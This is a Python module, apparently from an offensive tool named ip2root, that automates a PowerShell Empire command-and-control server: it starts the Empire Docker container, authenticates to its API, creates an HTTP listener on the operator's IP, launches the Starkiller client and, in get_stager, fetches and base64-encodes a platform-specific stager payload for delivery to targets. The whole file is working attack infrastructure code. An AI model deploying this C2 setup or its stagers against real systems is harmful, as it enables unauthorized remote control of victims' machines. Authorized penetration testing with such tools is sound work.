import docker
import os
import subprocess
import requests
import json
import base64
from time import sleep
import urllib3
import sys
import more_itertools
import getpass
import psutil
import constants
from utils import *
import random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def c2(LOCAL_IP) -> None | str:
    check_docker()
    is_up = False
    client = docker.from_env()

    for i in range(len(client.containers.list(all))):
        container = client.containers.get(client.containers.list(all)[i].__getattribute__('short_id'))
        if "bcsecurity/empire" in container.attrs['Config']['Image']:
            print('[+] Detected an existing C2 container')
            is_up = True
            empire_container = client.containers.list(all)[i]
            empire_container.start()
            for c in more_itertools.ncycles(['|', '/', '-', '\\'], 100):
                logs = '   ' + str(container.logs(tail=1).decode('utf-8'))
                sys.stdout.write('\033[2K\r[+] Starting the Docker... ' + c)
                if "WARNING: your terminal doesn't support" not in logs:
                    sys.stdout.write((logs.replace('\r', '')).replace('\n', ''))
                sys.stdout.flush()
                sleep(0.1)
                if 'Plugin csharpserver ran successfully!' in container.logs(tail=3).decode('utf-8'):
                    print('\n[+] C2 started successfully from existing docker (ID: {0})'.format(client.containers.list(all)[i].short_id))
                    break
            print('[+] Listening (CLIHTTP)') # Ask C2 for the port
            while True:
                login_infos = get_password(True)
                token = c2_token(login_infos[0], login_infos[1])
                if token == False:
                    print('[-] Wrong username or password. Please try again.')
                else:
                    break
            token = check_listener_host(token, LOCAL_IP, empire_container, login_infos)
            return client.containers.list(all)[i].short_id, token
    if not is_up:
        infos = deploy_c2(LOCAL_IP)
        return infos

def check_listener_host(token, LOCAL_IP, empire_container, login_infos):
    client = docker.from_env()
    url_listener = 'https://localhost:1337/api/listeners?token={0}'.format(token)
    headers = {"Content-Type": "application/json"}
    r = requests.get(url_listener, headers=headers, verify=False)
    json_listeners = json.loads(r.text)
    ip_listener_dict = {}
    for listener in json_listeners['listeners']:
        ip_listener_dict[listener['name']] = listener['options']['Host']['Value']
    if 'CLIHTTP' not in ip_listener_dict or LOCAL_IP not in ip_listener_dict['CLIHTTP']:
        url_delete = 'https://localhost:1337/api/listeners/CLIHTTP?token={0}'.format(token)
        requests.delete(url_delete, headers=headers, verify=False)
        try:
            C2_LISTENER_PORT = int(input('[!] Choose a port on which you want the C2 to listen (default: 8888): ') or 8888)
        except:
            print('[-] Port should be an integer, try again.')
            exit()
        c2_listener(token, LOCAL_IP, C2_LISTENER_PORT)
        ports = client.containers.get(empire_container.__getattribute__('short_id')).__getattribute__('ports')
        dict_port = {}
        dict_port['{0}/tcp'.format(C2_LISTENER_PORT)] = C2_LISTENER_PORT
        for i in ports:
            dict_port[i]=int(i.strip('/tcp'))
        new_container = 'empire{0}'.format(random.randint(0, 50))
        empire_container.stop()
        empire_container.commit(repository=new_container, tag=new_container)
        client.containers.run(image='{0}:{0}'.format(new_container), ports=dict_port, name=new_container, tty=True, detach=True)
        sleep(10)
        token = c2_token(login_infos[0], login_infos[1])

    return token


def deploy_c2(LOCAL_IP):
    try:
        C2_LISTENER_PORT = int(input('[!] Choose a port on which you want the C2 to listen (default: 8888): ') or 8888)
    except:
        print('[-] Port should be an integer, try again.')
        exit()
    print('[+] Deploying C2 container')
    login_infos = get_password(False)
    client = docker.from_env()
    container = client.containers.run(image='bcsecurity/empire:latest', ports={'1337/tcp':1337, '5000/tcp':5000, '{}/tcp'.format(C2_LISTENER_PORT):C2_LISTENER_PORT}, name='empire', tty=True, detach=True)
    for c in more_itertools.ncycles(['|', '/', '-', '\\'], 100):
        logs = '   ' + str(container.logs(tail=1).decode('utf-8'))
        sys.stdout.write('\033[2K\r[+] Starting the Docker... ' + c)
        sys.stdout.write((logs.replace('\r', '').replace('\n', '')))
        sys.stdout.flush()
        sleep(0.1)
        if 'Plugin csharpserver ran successfully!' in logs:
            print('\n[+] C2 created successfully')
            break
    container.exec_run("./ps-empire server --username {0} --password '{1}'".format(login_infos[0], login_infos[1]))
    token = c2_token(login_infos[0], login_infos[1])
    c2_listener(token, LOCAL_IP, C2_LISTENER_PORT)
    print('[+] C2 container created successfully (Docker ID : {0})'.format(container.short_id))
    print('[+] Listener created on port {} (CLIHTTP)'.format(C2_LISTENER_PORT))
    return container.short_id, token

def check_docker():
    res_docker = subprocess.check_output('which docker', shell=True, universal_newlines=True)
    if 'docker' not in res_docker:
        print('[-] Docker is not installed on your system. Please intall it from https://docs.docker.com')
        exit()
    res_group = subprocess.check_output('id -nG "$(whoami)" | grep -qw "docker" && echo 1 || echo 0 && id -nG "$(whoami)" | grep -qw "root" && echo 1 || echo 0', shell=True, universal_newlines=True)
    if '1' not in res_group:
        print('[-] Your current user is not part of the docker group. Add it or start ip2root with a user that is part of the docker group.')
        exit()

def get_password(status):
    if status == True:
        username = input('[!] Enter your username to access the C2 : ')
        password = getpass.getpass('[!] Enter your password to access the C2 : ')
    else:
        while True:
            username = input('[!] Create a username to access the C2 : ')
            password = getpass.getpass('[!] Create a password to access the C2 : ')
            confirm_password = getpass.getpass('[!] Confirm the password : ')
            if password == confirm_password:
                break
            else:
                print('[!] Passwords do not match. Try again please.')
    return username, password

def get_starkiller():
    STARKILLER_PATH = '/tmp/starkiller'
    if not os.path.exists(STARKILLER_PATH):
        STARKILLER_URL = 'https://github.com/BC-SECURITY/Starkiller/releases/download/v1.10.0/starkiller-1.10.0.AppImage'
        print('[+] Downloading starkiller in {} from {}'.format(STARKILLER_PATH, STARKILLER_URL))
        with open(STARKILLER_PATH, 'wb') as f:
            response = requests.get(STARKILLER_URL, stream=True, allow_redirects=True)
            total_length = response.headers.get('content-length')
            if total_length is None:
                f.write(response.content)
            else:
                dl = 0
                total_length = int(total_length)
                for data in response.iter_content(chunk_size=4096):
                    dl += len(data)
                    f.write(data)
                    done = int(50 * dl / total_length)
                    sys.stdout.write("\r[.] [%s%s]" % ('#' * done, ' ' * (50-done)) )    
                    sys.stdout.flush()
        print('\n[+] Starkiller downloading done')
    STARKILLER_RUNNING = False
    for i in psutil.pids():
        p = psutil.Process(i)
        if 'starkiller' in p.name():
            STARKILLER_RUNNING = True
            break
    if STARKILLER_RUNNING == False:
        subprocess.Popen(["chmod", "+x", STARKILLER_PATH])
        sleep(1)
        subprocess.Popen([STARKILLER_PATH])

def c2_token(username, password):
    try:
        url_c2 = 'https://localhost:1337/api/admin/login'
        headers = {"Content-Type": "application/json"}
        param = {"username":"{0}".format(username), "password":"{0}".format(password)}
        r_c2 = requests.post(url_c2, headers=headers, json=param, verify=False)
        json_token = json.loads(r_c2.text)
        token = json_token['token']
        return token
    except:
        print('[-] Fatal error, could not retrieve the token. Try again.')
        exit()
    
def c2_listener(token, LOCAL_IP, listener_port):
    url_listener = 'https://localhost:1337/api/listeners/http?token={0}'.format(token)
    param_listener = {"Name":"CLIHTTP", "Port":"{0}".format(listener_port), "Host":"{0}".format(LOCAL_IP)}
    headers = {"Content-Type": "application/json"}
    requests.post(url_listener, headers=headers, json=param_listener, verify=False)

def get_stager(system, token):
    url_stager = 'https://localhost:1337/api/stagers?token={0}'.format(token)
    param_stager = {"StagerName":constants.SYTEM_TO_STAGER[system], "Listener":"CLIHTTP"}
    headers_stager = {"Content-Type": "application/json"}
    r_stager = requests.post(url_stager, headers=headers_stager, json=param_stager, verify=False)
    payload = json.loads(r_stager.text)
    payload = payload[constants.SYTEM_TO_STAGER[system]]['Output']
    message_bytes = payload.encode('ascii')
    stager_b64 = base64.b64encode(message_bytes)

    return stager_b64
